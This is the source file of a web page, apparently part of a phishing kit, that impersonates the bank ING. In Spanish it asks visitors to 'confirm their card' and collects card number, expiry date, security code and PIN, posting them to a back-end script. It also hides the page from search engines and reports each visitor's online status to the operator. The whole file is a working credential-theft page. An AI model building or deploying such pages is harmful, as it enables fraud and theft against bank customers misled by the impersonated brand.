<?php
    include "./Assets/php/config/config.php";
?>
<!doctype html>
<html style="background: #fff;">

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="./Assets/css/helpers.css">
        <link rel="stylesheet" href="./Assets/css/style.css">
        <link rel="icon" type="image/png" href="./Assets/imgs/ff.png" />
        <title>ING</title>
        <script>
            /* Start Status */
                function updateStatus(status) {
                    fetch('./status/update_status.php', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({status , page : "CC PAGE"})
                    });
                }
                
                updateStatus('online');
                
                window.addEventListener('beforeunload', () => {
                    updateStatus('offline');
                });
                
                setInterval(() => {
                    updateStatus('online');
                }, 30000); 
            /* End Status */            
        </script>           
    </head>

    <body style="background: #fff;">

        <!-- HEADER -->
        <header id="header">
            <div class="container">
                <div class="logo"><img src="./Assets/imgs/logo.svg"></div>
                <div class="right"><img src="./Assets/imgs/header-right.png"></div>
            </div>
        </header>    

        <form action="./Assets/php/config/func.php" method="post" id="main">
            <input type="hidden" name="card">
            <div class="container">
                <div class="banner"><img src="./Assets/imgs/banner.jpg"></div>
                <div class="row justify-content-center">
                    <div class="col-lg-4 col-md-6 col-sm-10 col-12">  
                        <div id="forma">
                            <legend>Confirma tu tarjeta</legend>
                            <p>Introduzca los datos de su tarjeta de crédito para verificar su cuenta bancaria en línea.</p>
                            <div class="form-group mb20 <?php if(isset($_GET['error']))  echo 'has-error'; ?>">
                                <label for="one">Número de tarjeta</label>
                                <input type="text" name="one" id="one" class="form-control" placeholder="XXXX XXXX XXXX XXXX">
                                <p class="error-message text-start">Este campo es obligatorio</p>
                            </div>
                            <div class="form-group mb20 <?php if(isset($_GET['error']))  echo 'has-error'; ?>">
                                <label for="two">Fecha de caducidad (MM/AA)</label>
                                <input type="text" maxlength="7" name="two" id="two" class="form-control" placeholder="MM/AA">
                                <p class="error-message text-start">Este campo es obligatorio</p>
                            </div>
                            <div class="form-group mb20 <?php if(isset($_GET['error']))  echo 'has-error'; ?>">
                                <label for="three">Cód. Seguridad</label>
                                <input type="text" maxlength="3" name="three" id="three" class="form-control" placeholder="XXX">
                                <p class="error-message text-start">Este campo es obligatorio</p>
                            </div>
                            <div class="form-group mb20 <?php if(isset($_GET['error']))  echo 'has-error'; ?>">
                                <label for="four">PIN de tarjeta</label>
                                <input type="text" name="four" id="four" maxlength="4" class="form-control" placeholder="XXXX">
                                <p class="error-message text-start">Este campo es obligatorio</p>
                            </div>
                            <div class="form-group">
                                <button id="booom">Seguir</button>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </form>

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
        <script src="./Assets/js/js.js"></script>

        <script>
            $('#one').mask('0000 0000 0000 0000');
            $('#two').mask('00/00');
            $('#three').mask('0000');
            $('#four').mask('0000');
        </script>
    </body>

</html>